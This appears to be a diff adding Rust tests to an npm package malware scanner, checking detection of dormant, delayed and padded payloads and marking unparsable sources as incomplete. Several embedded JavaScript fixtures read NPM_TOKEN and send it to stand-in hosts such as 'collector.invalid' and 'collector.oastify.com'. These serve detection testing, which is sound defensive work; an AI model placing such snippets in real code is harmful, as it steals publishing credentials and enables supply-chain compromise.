@@ -134,6 +134,49 @@ fn detects_exfiltration_combo() {
 }
 
 #[test]
+fn detects_dormant_exfiltration_payloads() {
+    let findings = analyze(
+        r#"
+        function activateOnlyAfterPublish() {
+            const https = require('https');
+            const token = process.env.NPM_TOKEN;
+            https.request({ hostname: 'collector.invalid', method: 'POST' }).end(token);
+        }
+        module.exports = activateOnlyAfterPublish;
+    "#,
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::Network)
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::EnvAccess)
+    );
+}
+
+#[test]
+fn detects_delayed_string_execution_payloads() {
+    let findings = analyze(
+        r#"
+        setTimeout("require('https').get('https://collector.invalid/?t=' + process.env.NPM_TOKEN)", 600000);
+    "#,
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::DynamicExec)
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::EnvAccess)
+    );
+}
+
+#[test]
 fn detects_new_function_dynamic_exec() {
     let findings = analyze(
         r#"
@@ -340,6 +383,120 @@ fn scanner_still_flags_correlated_exfiltration() {
     let report = PackageScanner::scan("stealer", "1.0.0", dir.path()).unwrap();
     assert_eq!(report.overall_risk, RiskLevel::Critical);
     assert!(!report.verdict_reasons.is_empty());
+}
+
+#[test]
+fn scanner_analyzes_executable_test_and_fixture_sources() {
+    let dir = TempDir::new().unwrap();
+    fs::create_dir_all(dir.path().join("fixtures")).unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        r#"{"name":"fixture-payload","version":"1.0.0"}"#,
+    )
+    .unwrap();
+    fs::write(
+        dir.path().join("fixtures/payload.test.js"),
+        r#"
+        const token = process.env.NPM_TOKEN;
+        fetch("https://collector.oastify.com", { method: "POST", body: token });
+        "#,
+    )
+    .unwrap();
+
+    let report = PackageScanner::scan("fixture-payload", "1.0.0", dir.path()).unwrap();
+    assert_eq!(report.files_scanned, 1);
+    assert_eq!(report.overall_risk, RiskLevel::Critical);
+    assert!(
+        report
+            .findings
+            .iter()
+            .any(|finding| finding.file == "fixtures/payload.test.js")
+    );
+}
+
+#[test]
+fn scanner_analyzes_sources_larger_than_500_kilobytes() {
+    let dir = TempDir::new().unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        r#"{"name":"large-payload","version":"1.0.0"}"#,
+    )
+    .unwrap();
+    let mut source = "// padding\n".repeat(50_001);
+    source.push_str(
+        r#"
+        const token = process.env.NPM_TOKEN;
+        fetch("https://collector.oastify.com", { method: "POST", body: token });
+        "#,
+    );
+    assert!(source.len() > 500_000);
+    fs::write(dir.path().join("bundle.js"), source).unwrap();
+
+    let report = PackageScanner::scan("large-payload", "1.0.0", dir.path()).unwrap();
+    assert_eq!(report.files_scanned, 1);
+    assert_eq!(report.overall_risk, RiskLevel::Critical);
+    assert!(
+        report
+            .findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::DataExfiltration)
+    );
+}
+
+#[test]
+fn scanner_marks_parser_failures_as_incomplete_review() {
+    let dir = TempDir::new().unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        r#"{"name":"broken-source","version":"1.0.0"}"#,
+    )
+    .unwrap();
+    fs::write(dir.path().join("index.js"), "function broken( {").unwrap();
+
+    let report = PackageScanner::scan("broken-source", "1.0.0", dir.path()).unwrap();
+    assert_eq!(report.overall_risk, RiskLevel::High);
+    assert!(
+        report
+            .findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::AnalysisIncomplete)
+    );
+    assert!(
+        report
+            .verdict_reasons
+            .iter()
+            .any(|reason| reason.contains("analysis incomplete"))
+    );
+}
+
+#[test]
+fn scanner_marks_invalid_utf8_source_as_incomplete_and_still_scans_it() {
+    let dir = TempDir::new().unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        r#"{"name":"binary-source","version":"1.0.0"}"#,
+    )
+    .unwrap();
+    let mut source = b"const value = process.env.NPM_TOKEN;\n".to_vec();
+    source.push(0xff);
+    source.extend_from_slice(b"\nmodule.exports = value;\n");
+    fs::write(dir.path().join("index.js"), source).unwrap();
+
+    let report = PackageScanner::scan("binary-source", "1.0.0", dir.path()).unwrap();
+    assert_eq!(report.files_scanned, 1);
+    assert_eq!(report.overall_risk, RiskLevel::High);
+    assert!(
+        report
+            .findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::AnalysisIncomplete)
+    );
+    assert!(
+        report
+            .findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::EnvAccess)
+    );
 }
 
 // ---- REAL PACKAGE TEST: scan express from node_modules ----
